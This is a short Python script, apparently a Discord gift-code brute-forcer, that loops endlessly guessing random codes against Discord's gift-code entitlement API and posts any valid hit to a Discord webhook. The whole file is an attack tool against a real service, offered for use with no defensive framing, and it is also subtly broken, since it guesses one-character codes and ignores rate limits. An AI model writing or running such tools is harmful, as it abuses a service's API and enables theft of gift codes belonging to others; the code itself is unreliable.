import requests
import random
import string
import discord_webhook

# Configure Discord Webhook
webhook_url = "YOUR_DISCORD_WEBHOOK_URL"
webhook = discord_webhook.DiscordWebhook(url=webhook_url)

while True:
    # Generate a random alphanumeric string
    code = ''.join(random.choices(string.ascii_letters + string.digits, k=1))

    # Construct the URL with the generated code
    url = f"https://discordapp.com/api/v9/entitlements/gift-codes/{code}?with_application=false&with_subscription_plan=true"

    # Send a GET request to the URL
    response = requests.get(url)

    # Check if the response status code is 200
    if response.status_code == 200:
        # Send the code to the Discord Webhook
        webhook.content = f"Valid code found: {code}"
        webhook.execute()
